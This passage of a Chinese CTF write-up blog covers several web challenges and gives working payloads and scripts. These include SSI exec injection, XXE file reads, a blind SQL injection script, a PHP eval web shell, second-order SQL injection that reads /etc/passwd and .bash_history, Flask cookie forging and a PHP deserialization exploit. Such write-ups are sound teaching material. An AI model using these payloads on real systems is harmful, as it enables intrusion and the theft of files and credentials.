<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line">def md5(s):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">'6d0bc1'</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">def findmd5(sss):    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = int(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in range(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="keyword">print</span>(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="keyword">list</span>.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.map(findmd5, <span class="keyword">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>也有个简单的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(<span class="string">'6d0bc1'</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>碰撞出来的结果为：<code>51302775</code><br>然后我们使用改密码登录，在响应头里面发现了生成的url</p>
<p><img src="/2020/04/14/BUU-web4/15.png" alt><br>然后利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd="命令"--&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd="ls ../"--&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后访问生成的url得到flag目录<br><img src="/2020/04/14/BUU-web4/16.png" alt>|<br>访问得到flag</p>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>一道简单的xml题目，抓包读取flag就可以了<br>payload： </p>
<blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY admin SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;admin;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>fas<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/04/14/BUU-web4/17.png" alt></p>
<h1 id="CISCN2019Web1-Easyweb"><a href="#CISCN2019Web1-Easyweb" class="headerlink" title="[CISCN2019Web1]Easyweb"></a>[CISCN2019Web1]Easyweb</h1><p>考点：</p>
<p>1：备份文件泄露<br>2：SQL注入<br>3：php短标签<br>短标签需要php.ini开启short_open_tag = On，但不受该条控制。</p>
<p>题目为一个登陆框，但是无论怎么输入都无回显，查看源码发现<code>image.php?id=1</code>,之后扫目录发现<code>robots.txt</code> 和<code>upload.php</code> 最后得到image.php.bak的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>显示了SQL语句，并且当id为<code>\0</code>的时候经过str_replace替换后会生成<code>\</code>将<code>&#39;</code>注释掉，这样我们便可以在path处进行盲注<br><img src="/2020/04/14/BUU-web4/1588205986672.png" alt="1588205986672"></p>
<p>写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://299dd202-9663-4d3f-b60d-63e4e95e69f9.node3.buuoj.cn/image.php'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload = url + <span class="string">'?id=\\0'</span> + <span class="string">'&amp;path=%20or ascii(substr(database(),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(mid) + <span class="string">'%23'</span></span><br><span class="line">        payload2 = url + <span class="string">'?id=\\0'</span> + <span class="string">'&amp;path=%20or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(mid) + <span class="string">'%23'</span></span><br><span class="line">        payload3 = url + <span class="string">'?id=\\0'</span> + <span class="string">'&amp;path=%20or ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(mid) + <span class="string">'%23'</span></span><br><span class="line">        payload4 = url + <span class="string">'?id=\\0'</span> + <span class="string">'&amp;path=%20or ascii(substr((select password from users),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(mid) + <span class="string">'%23'</span></span><br><span class="line">        <span class="comment">#print(payload3)</span></span><br><span class="line">        res = requests.get(url=payload4)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    result+=chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>这里要将表名使用十六进制<br><img src="/2020/04/14/BUU-web4/1588211541198.png" alt="1588211541198"></p>
<p>得到密码为</p>
<blockquote>
<p>admin        e650500a1e55d7afe748    </p>
</blockquote>
<p>登陆后发现可以文件上传，上传一张图片后</p>
<p><img src="/2020/04/14/BUU-web4/1588212123754.png" alt="1588212123754"></p>
<p>php短标签</p>
<p>因为不允许上传带php的文件名，我们用php短标签来绕过<br><code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>可以用<code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code>来代替。这个文件名，会被写入日志文件中去</p>
<p><img src="/2020/04/14/BUU-web4/1588212453198.png" alt="1588212453198"></p>
<p>然后使用蚁剑连接便可以得到flag</p>
<p><img src="/2020/04/14/BUU-web4/1588212754536.png" alt="1588212754536"></p>
<h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><p>一个留言板，需要登录。<br><img src="/2020/04/14/BUU-web4/1588231108332.png" alt="1588231108332"></p>
<p>上面显示的应该就是用户名和密码了，密码盲猜后三位是数字，使用burp爆破得到为666。</p>
<p><img src="/2020/04/14/BUU-web4/1588231291536.png" alt="1588231291536">扫目录发现git源码泄漏，将源码下载下来，但是源码并不完整<br>再一次进行恢复<br><code>git log --reflog</code><br><code>git reset --hard af36ba2d86ee43cde7b95db513906975cb8ece03</code></p>
<p>write_do.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">     <span class="comment">#接受字符串并将特殊的字符转义</span></span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    <span class="comment">#写入 SQL语句</span></span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    <span class="comment">#执行sql</span></span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);		<span class="comment">#转义</span></span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;		<span class="comment">#拼接</span></span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);		<span class="comment">#获取行数</span></span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];<span class="comment">#从结果集中取得一行作为关联数组，或数字数组</span></span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可以进行二次注入<br>首先写评论的时候数据写到board 然后再次评论的时候 category这个变量会从 board<br>表中读取然后构成二次注入<br>例如：<br>新发一个帖子，category里面填写<code>&#39;, content=user(),/*</code><br><img src="/2020/04/14/BUU-web4/1588240792230.png" alt="1588240792230"></p>
<p>然后点详情，留言板里面留<code>*/#</code>将<code>&#39;, content=user(),/*</code>闭合，从而形成二次注入,由于SQL语句有换行，所以使用/**/来进行多行注释。<br><img src="/2020/04/14/BUU-web4/1588240871436.png" alt="1588240871436"></p>
<p>此时的SQL语句为</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">         <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">' '</span>, <span class="keyword">content</span>=<span class="keyword">user</span>(),<span class="comment">/*',</span></span><br><span class="line"><span class="comment">             content = '\*/</span><span class="comment">#',</span></span><br><span class="line">             bo_id = <span class="string">'$bo_id'</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>效果应该是这样<br><img src="/2020/04/14/BUU-web4/1588242588044.png" alt="1588242588044"></p>
<p>之后读取一下/etc/passwd文件</p>
<blockquote>
<p>‘,content=(select load_file(‘//etc/passwd’)),/*</p>
</blockquote>
<p><img src="/2020/04/14/BUU-web4/1588242823815.png" alt="1588242823815"></p>
<p>得到www目录<br>然后查看用户的命令记录</p>
<blockquote>
<p>‘,content=(select load_file(‘/home/www/.bash_history’)),/*</p>
</blockquote>
<p><img src="/2020/04/14/BUU-web4/1588243141018.png" alt="1588243141018"></p>
<p>在读取.DS_Store文件,该文件在/tmp/html里面</p>
<blockquote>
<p>‘,content=(select load_file(‘/tmp/html/.DS_Store’)),/*</p>
</blockquote>
<p>结果只显示了一部分，于是使用十六进制读取</p>
<blockquote>
<p>‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</p>
</blockquote>
<p>flag_8946e1ff1ee3e40f.php</p>
<blockquote>
<p>‘,content=(select hex(load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’))),/*</p>
</blockquote>
<p>解码后得到flag</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HackPack&amp;NPUCTF&amp;安恒四月</title>
    <url>/2020/04/29/CTF-WEB/</url>
    <content><![CDATA[<p>Hackpack CTF&amp;&amp;NPUCTF&amp;&amp;安恒四月赛&amp;&amp;hacker101CTF<br>部分题目</p>
<p><strong>Super Secret Flag Vault</strong><br>知识点：md5弱类型</p>
<p><strong>Paster</strong><br>知识点：xss</p>
<p><strong>Cookie Forge</strong><br>知识点：cookie伪造</p>
<p><strong>Custom UI</strong><br>知识点：xxe</p>
<p><strong>RealEzPHP</strong><br>知识点：PHP反序列化</p>
<p><strong>ezlogin</strong><br>知识点：Xpath盲注</p>
<p><strong>ezinclude</strong><br>知识点：hash拓展攻击、php://filter/string.strip_tags/resource在文件包含处导致php崩溃</p>
<p><strong>Ezunserialize</strong><br>知识点：php反序列化</p>
<a id="more"></a>

<h1 id="HackPack-CTF"><a href="#HackPack-CTF" class="headerlink" title="HackPack CTF"></a><a href="https://ctf2020.hackpack.club/" target="_blank" rel="noopener">HackPack CTF</a></h1><h2 id="Treasure-Map"><a href="#Treasure-Map" class="headerlink" title="Treasure Map"></a>Treasure Map</h2><p><a href="https://treasure-map.cha.hackpack.club/" target="_blank" rel="noopener">https://treasure-map.cha.hackpack.club/</a></p>
<p>打开题目发现有很多”岛屿”，我们需要找到有宝藏的那个”岛屿”</p>
<p><img src="/2020/04/29/CTF-WEB/1587181406059.png" alt="1587181406059">随便点一个，发现url为：<a href="https://treasure-map.cha.hackpack.club/1，我们可以写一个简单的脚本来帮我们访问" target="_blank" rel="noopener">https://treasure-map.cha.hackpack.club/1，我们可以写一个简单的脚本来帮我们访问</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2260</span>,<span class="number">10000</span>):</span><br><span class="line">  payload = <span class="string">"https://treasure-map.cha.hackpack.club/"</span>+str(i)</span><br><span class="line">  print(payload)</span><br><span class="line">  res = requests.get(payload)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'Not Found'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>但是后来我放弃了，10000页，想到可以直接使用burp爆破吧<br>但是跑完了也没有什么发现，后来仔细一看那英文，<code>or hidden</code>…..然后直接看一下robots.txt。接着顺着出现的目录就能找到flag了…下次做题之前先扫目录！！！！<img src="/2020/04/29/CTF-WEB/1587189684781.png" alt="1587189684781"></p>
<h2 id="Super-Secret-Flag-Vault"><a href="#Super-Secret-Flag-Vault" class="headerlink" title="Super Secret Flag Vault"></a>Super Secret Flag Vault</h2><p>这题简单，下载源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="comment">// this is how I store hashes right?</span></span><br><span class="line">      $hash = <span class="string">"0e770334890835629000008642775106"</span>;</span><br><span class="line">      <span class="keyword">if</span>(array_key_exists(<span class="string">"combination"</span>,$_REQUEST) &amp;&amp; $_REQUEST[<span class="string">"combination"</span>] !== <span class="string">''</span>)&#123;</span><br><span class="line">          <span class="comment">//Isn't it great that == works in every language?</span></span><br><span class="line">          <span class="keyword">if</span>(array_key_exists(<span class="string">"debug"</span>, $_REQUEST))&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">"&lt;br&gt; "</span>. md5($_REQUEST[<span class="string">"combination"</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(md5($_REQUEST[<span class="string">"combination"</span>]) == $hash)&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">"&lt;br&gt; The Flag is flag&#123;...&#125;&lt;br&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Wrong!&lt;br&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一眼看上去是md5弱类型绕过，直接传参?combination=s878926199a就可以了</p>
<h2 id="Paster"><a href="#Paster" class="headerlink" title="Paster"></a>Paster</h2><p>Come and BETA Test our new social networking site. Its like twitter but shorter<br>开始进去很蒙，不知道题目的意思是什么，只有一个输入框。先弹窗在说<br>一通乱输后发现后面输入的会变成一个链接<br><img src="/2020/04/29/CTF-WEB/1587562773508.png" alt="1587562773508"></p>
<p>这有点像javascript伪协议，于是抱着试一下的心态改了一下前端代码，结果就出来了。。<br><img src="/2020/04/29/CTF-WEB/1587562853859.png" alt="1587562853859"></p>
<p>这……<br>flag{x55_i5Nt_7hA7_bAD_R1Gh7?}</p>
<h2 id="Cookie-Forge"><a href="#Cookie-Forge" class="headerlink" title="Cookie Forge"></a>Cookie Forge</h2><p><a href="https://cookie-forge.cha.hackpack.club" target="_blank" rel="noopener">https://cookie-forge.cha.hackpack.club</a></p>
<p>题目为cookie伪造，当创建用户登录后提示<code>You aren&#39;t a Flagship Loyalty Member!  No cookies for you!!</code>,猜测应该是要修改cookie让我们变成会员。<img src="/2020/04/29/CTF-WEB/1588085552293.png" alt="1588085552293"></p>
<p>应该要将flagship后面改为tru，但是一直没有找到合适的修改工具，后面看wp后才知道要使用flask-unsign<br>大佬使用的工具地址：<a href="https://pypi.org/project/flask-unsign/" target="_blank" rel="noopener">https://pypi.org/project/flask-unsign/</a></p>
<p>安装</p>
<blockquote>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> flask-unsign[wordlist]</span><br><span class="line"><span class="comment">#首先要安装pip3</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>执行</p>
<blockquote>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//先使用工具解码</span></span><br><span class="line">flask-unsign -d -c 'eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoidG90byJ9.Xp2SeA.1l6nDFaIsDZ8bCXcxdtORRVIBK0'</span><br></pre></td></tr></table></figure>
</blockquote>
<p>解密</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">flask-unsign <span class="params">--server</span> https:<span class="string">//cookie-forge.cha.hackpack.club/orders</span> <span class="params">--unsign</span></span><br></pre></td></tr></table></figure>

<p>伪造</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">flask-unsign </span><span class="built_in">--sign</span> <span class="built_in">--secret</span> <span class="string">password1 </span><span class="built_in">--cookie</span> <span class="string">"&#123;'flagship': True, 'username': 'toto'&#125;"</span></span><br></pre></td></tr></table></figure>

<p>最后抓包修改cookie得到flag</p>
<p><img src="/2020/04/29/CTF-WEB/1588088107869.png" alt="1588088107869"></p>
<p>参考文章：<a href="https://ctftime.org/writeup/20339" target="_blank" rel="noopener">https://ctftime.org/writeup/20339</a></p>
<h2 id="Custom-UI"><a href="#Custom-UI" class="headerlink" title="Custom UI"></a>Custom UI</h2><p><a href="https://custom-ui.cha.hackpack.club/" target="_blank" rel="noopener">https://custom-ui.cha.hackpack.club/</a></p>
<p><img src="/2020/04/29/CTF-WEB/1588118639585.png" alt="1588118639585"></p>
<p>我们可以输入数据来更改按钮的颜色并向其中添加文本。如果输入 <code>&lt;&gt;</code>这种特殊符号，则会触发错误<img src="/2020/04/29/CTF-WEB/1588120582969.png" alt="1588120582969"></p>
<p>并且抓包后发现参数形式为</p>
<blockquote>
<p>xdata=&lt;button&gt;&lt;color&gt;aaa&lt;/color&gt;&lt;value&gt;aaa&lt;/value&gt;&lt;/button&gt;</p>
</blockquote>
<p>所以可以尝试XML外部实体（XXE）注入,并且将debug改为true就可以得到flag的位置<br>payload：</p>
<blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span><span class="meta">&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY aaa SYSTEM "file:///etc/flag.txt"&gt;]&gt;</span><span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">color</span>&gt;</span>&amp;aaa;<span class="tag">&lt;/<span class="name">color</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>iii<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里要将其进行url编码，不然&amp;符号会将传参分隔<br><img src="/2020/04/29/CTF-WEB/1588121040216.png" alt="1588121040216"></p>
<p><a href="https://maggick.fr/2020/04/hackpack-ctf-2020.html" target="_blank" rel="noopener">https://maggick.fr/2020/04/hackpack-ctf-2020.html</a></p>
<h1 id="NPUCTF"><a href="#NPUCTF" class="headerlink" title="NPUCTF"></a>NPUCTF</h1><h2 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h2><p>view-source:</p>
<h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>查看源码，得到题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>一个简单的反序列化，可以试着构造命令执行<code>assert(eval($_GET[a]))</code></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp();</span><br><span class="line">$c-&gt;b = <span class="string">'assert'</span>;</span><br><span class="line">$c-&gt;a = <span class="string">'eval($_POST[\'a\'])'</span>;</span><br><span class="line">$a = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<blockquote>
<p>O:8:”HelloPhp”:2:{s:1:”a”;s:17:”eval($_POST[‘a’])”;s:1:”b”;s:6:”assert”;}</p>
</blockquote>
<p>最后执行b=phpinfo();便得到flag</p>
<p><img src="/2020/04/29/CTF-WEB/1587433414613.png" alt="1587433414613"></p>
<h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>提示：Xpath盲注<br>进入题目为一个登录框，心想应该是个sql注入之类的，但是发现基本提交一次后便会要求刷新后再提交。之后抓包发现提交的格式为<code>&lt;username&gt;aaa&lt;/username&gt;&lt;password&gt;ddd&lt;/password&gt;&lt;token&gt;595d7b7058c14932e500d4c185e38TU4&lt;/token&gt;</code>，这个一般都会想到使用xxe来做，但是并没有成功。</p>
<h3 id="Xpath基础"><a href="#Xpath基础" class="headerlink" title="Xpath基础"></a>Xpath基础</h3><p>XPath是XML的路径语言，使用路径表达式来选取XML文档中的节点或者节点集</p>
<p>1.表达式</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>nodename</td>
